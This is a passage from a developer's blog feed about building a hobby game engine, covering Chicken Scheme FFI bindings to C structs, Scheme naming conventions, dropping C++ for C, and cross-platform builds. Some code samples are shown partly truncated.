&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We could also use &lt;a href="https://wiki.call-cc.org/man/5/Module%20(chicken%20foreign)#foreign-lambda"&gt;&lt;code&gt;foreign-lambda*&lt;/code&gt;&lt;/a&gt; (Notice the asterisk). This is similar to &lt;code&gt;foreign-lambda&lt;/code&gt; but accepts C code as a string.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;vec3_print&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;foreign-lambda*&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;void&lt;/span&gt;&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="c1"&gt;; The return type&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(((&lt;/span&gt;&lt;span class="nf"&gt;c-pointer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a0&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;; The parameter to pass, a pointer to a Vec3 object&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3Print(*a0);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="c1"&gt;; The C code in string from&lt;/span&gt;
&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="c1"&gt;; Vec3Print accepts a non pointer, we dereference it&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_print&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_create&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;3.3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="c1"&gt;; Creates a vec3 and prints it&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id="inline-c-code-in-foreign-lambda"&gt;Inline C code in foreign-lambda*&lt;/h2&gt;
&lt;p&gt;Here's another example using &lt;code&gt;foreign-lambda*&lt;/code&gt;. This time there is no predefined C function, but instead we define the code inside the lisp function's body.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;vec3_zero&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;foreign-lambda*&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;c-pointer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="c1"&gt;; Empty variables&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3* v = (Vec3*)Vec3Create(0.0f, 0.0f, 0.0f); &lt;/span&gt;
&lt;span class="s"&gt;    C_return(v);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;               &lt;/span&gt;&lt;span class="c1"&gt;; Instead of &amp;quot;return&amp;quot;, we use &amp;quot;C_return&amp;quot;.&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_print&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_zero&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="c1"&gt;; Calls vec3_zero and prints the returned Vec3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Note that due to obscure technical reasons &lt;code&gt;C_return&lt;/code&gt; must be used instead of &lt;code&gt;return&lt;/code&gt; when returning a value. More info about this &lt;a href="https://wiki.call-cc.org/man/5/Module%20(chicken%20foreign)#foreign-lambda"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id="free-ing-vec3-pointers"&gt;Free-ing Vec3 pointers&lt;/h2&gt;
&lt;p&gt;Since &lt;code&gt;Vec3Create&lt;/code&gt; allocates memory for a Vec3 struct using &lt;code&gt;malloc&lt;/code&gt;, it's a good idea to free this when we are done using it. To do this we could bind a function to &lt;code&gt;free&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;free&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;foreign-lambda&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;free&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;c-pointer&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nf"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_zero&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_print&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;free&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id="setting-up-getters-and-setters"&gt;Setting up getters and setters&lt;/h2&gt;
&lt;p&gt;If we want to have access to variables of a struct object. We could do something like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;vec3_x&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;foreign-lambda*&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;float&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(((&lt;/span&gt;&lt;span class="nf"&gt;c-pointer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Vec3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a0&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;C_return(a0-&amp;gt;x);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;display&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;vec3_create&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8.8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8.8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8.8&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now this is fine but it'll be a pain to specify an accessor for every variable. A better solution is to use the &lt;a href="http://wiki.call-cc.org/eggref/5/foreigners#define-foreign-enum-type"&gt;&lt;code&gt;foreigners&lt;/code&gt;&lt;/a&gt; egg which allows the use of macros that will make our lives easier.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;chicken&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;foreign&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;foreigners&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;;; Set up the accessors for Vec3 struct&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;These are the basic FFI implementations that I have explored. It should be enough for most uses. The example project with working code can be found &lt;a href="https://github.com/accidentalrebel/chicken-scheme-ffi-example"&gt;on Github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Also, check out &lt;a href="http://wiki.call-cc.org/eggref/5/bind"&gt;the chicken-bind egg&lt;/a&gt;, it already has all of the code above conveniently in one package. If you don't need full control and just want a simple FFI solution then this is what you need.&lt;/p&gt;</content><category term="Misc"/><category term="programming"/><category term="dev"/><category term="research"/><category term="code"/></entry><entry><title>#5 - Switching from C/C++ to C</title><link href="https://www.accidentalrebel.com/switching-from-c-c---to-c.html" rel="alternate"/><published>2020-05-19T17:59:00+08:00</published><updated>2020-05-19T17:59:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2020-05-19:/switching-from-c-c---to-c.html</id><summary type="html">&lt;p&gt;After the recent changes to the &lt;a href="https://www.accidentalrebel.com/following-lispy-conventions.html"&gt;lisp side of my engine&lt;/a&gt;, I took some time to review the C/C++ side.

My thinking is that sticking with just one language would make the code simpler as I only have to use it's subset of features. I know it's not a solid reason but I figured it's better to act now while it is still early.&lt;/p&gt;
&lt;p&gt;&lt;img alt="switching-from-c-c---to-c-01" src="https://www.accidentalrebel.com/images/switching-from-c-c---to-c-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;For the most part, dropping C++ was easy. Most of the difficulty I encountered was making sure the changes worked on all three supported platforms. There was a situation when &lt;a href="https://github.com/accidentalrebel/rebel-game-engine/commits/cglm-switch-fix"&gt;I thought I was done&lt;/a&gt; only to find it doesn't work on Mac and Windows. I had to &lt;a href="https://github.com/accidentalrebel/rebel-game-engine/commits/cglm-switch-fix"&gt;slowly re-apply&lt;/a&gt; the changes just to see where exactly things went wrong.&lt;/p&gt;
&lt;p&gt;What's funny is that I learned that I was using a lot more C++ features than I thought. Namespaces and default arguments are some that really surprised me. I always assumed they were supported on both languages. This just proves to me that I still have a lot to learn with these languages.&lt;/p&gt;
&lt;p&gt;I also took the chance during the transition to switch from &lt;a href="https://glm.g-truc.net/0.9.9/index.html"&gt;GLM&lt;/a&gt;, an OpenGL Mathematics lirary using C++, to &lt;a href="https://github.com/recp/cglm"&gt;CGLM&lt;/a&gt; a similar library that uses C. It is claimed that the latter is more optimized and, with it being in C, is easier to integrate with my codebase.&lt;/p&gt;
&lt;p&gt;While these changes did not do much in terms of progress, I am happy that my codebase now feels tighter and more coherent. I'm hoping to work on something engine-related next.&lt;/p&gt;

&lt;p&gt;I was adding new Lisp functions to &lt;a href="https://github.com/accidentalrebel/Rebel-Game-Engine"&gt;my game engine&lt;/a&gt; when I noticed that I had functions that had a naming scheme that were inconsistent with others. For example, I had ones that create objects like &lt;em&gt;sprite_create&lt;/em&gt; and &lt;em&gt;shader_create&lt;/em&gt; but this one function I named &lt;em&gt;make_vec3&lt;/em&gt;. I proceeded to rename &lt;em&gt;make_vec3&lt;/em&gt; to &lt;em&gt;vec3_create&lt;/em&gt;. Not only is it consistent with other names but it made me realize that having a pattern of object_verb makes it easy to parse the function and what it does. &lt;/p&gt;
&lt;p&gt;This made me wonder if there are other ways I could improve which led me to this page &lt;a href="http://community.schemewiki.org/?variable-naming-convention"&gt;about variable naming conventions&lt;/a&gt; for Scheme. I learned that the language employs a rather effective yet simple naming convention for functions and variables. I've noticed them before but never really thought about their usefulness. &lt;/p&gt;
&lt;p&gt;For example, adding a &lt;em&gt;?&lt;/em&gt; prefix easily indicates that the function, when called, will always return …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="following-lispy-conventions-01" src="https://www.accidentalrebel.com/images/following-lispy-conventions-01.png" /&gt;&lt;/p&gt;

&lt;p&gt;For example, adding a &lt;em&gt;?&lt;/em&gt; prefix easily indicates that the function, when called, will always return a boolean value. I looked at my code and I had the function &lt;em&gt;is_key_down&lt;/em&gt;. Changing it to &lt;em&gt;key_down?&lt;/em&gt; looked weird at first but I liked how it made the function name shorter and the &lt;em&gt;?&lt;/em&gt; prefix made it easy to spot and parse.&lt;/p&gt;
&lt;p&gt;Okay, cool! What's next?&lt;/p&gt;
&lt;p&gt;Adding a &lt;em&gt;!&lt;/em&gt; indicates a function that mutates data. Most commonly used for setting a variable. I saw I had variables like &lt;em&gt;set_vec3_x&lt;/em&gt;, to which I changed to &lt;em&gt;vec3_x!&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This went on as I continue to find improvements. Here's a list of all the naming convention changes that I've made:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center;"&gt;&lt;strong&gt;The change&lt;/strong&gt;&lt;/th&gt;
&lt;th style="text-align: center;"&gt;&lt;strong&gt;From&lt;/strong&gt;&lt;/th&gt;
&lt;th style="text-align: center;"&gt;&lt;strong&gt;To&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;&lt;em&gt;:&lt;/em&gt; infix for namespaces.&lt;/td&gt;
&lt;td style="text-align: center;"&gt;vec3_create&lt;/td&gt;
&lt;td style="text-align: center;"&gt;vec3:create&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;&lt;em&gt;?&lt;/em&gt; postfix for boolean functions&lt;/td&gt;
&lt;td style="text-align: center;"&gt;key_down?&lt;/td&gt;
&lt;td style="text-align: center;"&gt;key:down?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;&lt;em&gt;!&lt;/em&gt; postfix for destructive functions&lt;/td&gt;
&lt;td style="text-align: center;"&gt;set_camera_position&lt;/td&gt;
&lt;td style="text-align: center;"&gt;camera:position!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;&lt;em&gt;%&lt;/em&gt; postfix for low level functions&lt;/td&gt;
&lt;td style="text-align: center;"&gt;free&lt;/td&gt;
&lt;td style="text-align: center;"&gt;free%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;&lt;em&gt;%&lt;/em&gt; prefix and postfix for low level variables&lt;/td&gt;
&lt;td style="text-align: center;"&gt;shader-pointer&lt;/td&gt;
&lt;td style="text-align: center;"&gt;%shader-pointer%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;&lt;em&gt;*&lt;/em&gt; prefix and postfix for global variables&lt;/td&gt;
&lt;td style="text-align: center;"&gt;cube-shader&lt;/td&gt;
&lt;td style="text-align: center;"&gt;*cube-shader*&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Again, these new changes felt weird at first but I quickly became accustomed the more of these functions I changed. The code became easier to scan as there are now key characters for my eyes to easily latch onto. Something to appreciate especially with multi-level nested expressions.&lt;/p&gt;
&lt;p&gt;Here's how the code now looks like with the new functions:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;MOVEMENT_SPEED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.001&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nv"&gt;*cube-positions*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;window:swap&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I also changed my C functions to reflect a &lt;em&gt;NamespaceVerb&lt;/em&gt; convention. I could have used &lt;em&gt;namespace::Verb&lt;/em&gt; but the &lt;a href="http://wiki.call-cc.org/eggref/5/bind"&gt;FFI that I use&lt;/a&gt; to communicate with C cannot parse C namespaces. So instead of &lt;em&gt;Shader::Create&lt;/em&gt;, I am left with &lt;em&gt;ShaderCreate&lt;/em&gt;. This is unfortunate, but I'm fine with it since the lisp scripting side of the engine will be the most prominently used (Plus, &lt;a href="https://www.raylib.com/examples.html"&gt;Raylib also uses this convention&lt;/a&gt; for their functions).&lt;/p&gt;
&lt;p&gt;I am happy that I was able to do these changes early. Because of this, readability of my code has increased, something I worried about when I first started implementing scripting.&lt;/p&gt;</content><category term="Misc"/><category term="dev"/><category term="game_engine"/></entry><entry><title>#3 - Rebel Game Engine now works on different platforms</title><link href="https://www.accidentalrebel.com/rebel-game-engine-now-works-on-different-platforms.html" rel="alternate"/><published>2020-05-10T07:08:00+08:00</published><updated>2020-05-10T07:08:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2020-05-10:/rebel-game-engine-now-works-on-different-platforms.html</id><summary type="html">&lt;p&gt;After &lt;a href="implemented-basic-scheme-scripting-for-rebel-game-engine.md"&gt;finishing the integration&lt;/a&gt; of Chicken-scheme scripting for &lt;a href="https://github.com/accidentalrebel/Rebel-Game-Engine"&gt;my custom game engine&lt;/a&gt; I decided I wanted to tackle another hard problem, and that is making it cross-platform.

I learned so much about cross-compilers, portable makefiles, and the quirks of different package managers.&lt;/p&gt;
&lt;p&gt;After a week of this I was finally able to get the engine working on all three platforms. To make sure others can be able to do the same, I also documented the steps which can now be read on &lt;a href="https://github.com/accidentalrebel/rebel-game-engine/wiki"&gt;the project's wiki&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;I was surprised that the hardest one to get working was for Windows. Because I didn't want to create a separate build system that uses Visual Studio solution files, I had to find a simple way to make it work and that involved the use of an excellent building platform for Windows called &lt;a href="https://www.msys2.org/"&gt;Msys2&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;I am quite happy that I was able to structure the whole system so that you only need one Makefile for all three platforms. I'm not sure if this wil change in the future, but I'll do my best for it to stay like this as long as it's possible.&lt;/p&gt;
&lt;p&gt;If you are interested to try it out here's the project's &lt;a href="https://github.com/accidentalrebel/rebel-game-engine"&gt;Github page&lt;/a&gt;, depending on your platform here are the instructions on how to build for each one: &lt;a href="https://github.com/accidentalrebel/rebel-game-engine/wiki/Building-and-running-the-engine-for-Arch-Linux"&gt;Linux&lt;/a&gt;, &lt;a href="https://github.com/accidentalrebel/rebel-game-engine/wiki/Building-and-running-the-engine-for-MacOSX"&gt;MacOSX&lt;/a&gt; and &lt;a href="https://github.com/accidentalrebel/rebel-game-engine/wiki/Building-and-running-the-engine-for-Windows-(using-Msys2)"&gt;Windows&lt;/a&gt;.&lt;/p&gt;</content><category term="Misc"/><category term="dev"/><category term="game_engine"/></entry><entry><title>#2 - Implemented basic Scheme scripting for Rebel Game Engine</title><link href="https://www.accidentalrebel.com/implemented-basic-scheme-scripting-for-rebel-game-engine.html" rel="alternate"/><published>2020-05-07T21:35:00+08:00</published><updated>2020-05-07T21:35:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2020-05-07:/implemented-basic-scheme-scripting-for-rebel-game-engine.html</id><summary type="html">&lt;p&gt;When I first learned about &lt;a href="http://synthcode.com/wiki/chibi-scheme"&gt;Chibi&lt;/a&gt;, an embeddable scheme that allows scripting on C programs, I immediately tried it out on my game engine. I was able to make it work with my existing APIs but I kept on running against segfaults and memory issues. The community was helpful in answering my questions as I tried to track down the cause of the bug, but I eventually gave up out of frustration.&lt;/p&gt;
&lt;p&gt;I then learned about &lt;a href="http://wiki.call-cc.org/eggref/5/bind"&gt;Chicken Scheme&lt;/a&gt;, a somewhat competitor to Chibi that does the same thing but with a larger community and more documentation. I checked it out and liked it so I went ahead and implemented it.&lt;/p&gt;

&lt;p&gt;I then learned about &lt;a href="http://wiki.call-cc.org/eggref/5/bind"&gt;Chicken Scheme&lt;/a&gt;, a somewhat competitor to Chibi that does the same thing but with a larger community and more documentation. I checked it out and liked it so I went ahead and implemented it.&lt;/p&gt;
&lt;p&gt;&lt;img alt="implemented-basic-scheme-scripting-for-rebel-game-engine-01" src="https://www.accidentalrebel.com/images/implemented-basic-scheme-scripting-for-rebel-game-engine-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;Thankfully I have not experienced any segfaults anymore. It's not because Chicken is better (I don't know well enough of the two to make a good comparison) but because I've come to better understand how to properly structure my code after two implementations.&lt;/p&gt;
&lt;p&gt;And my code did change a lot. The biggest change is switching from an object oriented approach to functional style so that it would suit Lisp scripting. I also paid special attention in making sure that whatever change I made would make sense when the game engine is used without scripting. My guiding principle is that implementing a game on both C and Scheme should be structurally identical, aside from the difference in syntaxes, of course.&lt;/p&gt;
&lt;p&gt;Here's a simple program wher you could move a colored box using the keyboard:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;box-sprite&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;box-pos&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;init&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;set!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;box-sprite&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;sprite_create&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;assets/textures&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;tile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;png&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;set!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;box-pos&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;make_vec3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;400&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;300&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;#t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;update&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;window_clear&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nf"&gt;tint&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;make_vec3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;sprite_draw&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;box-sprite&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;box-pos&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;tint&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;#f&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;window_swap&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;#t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

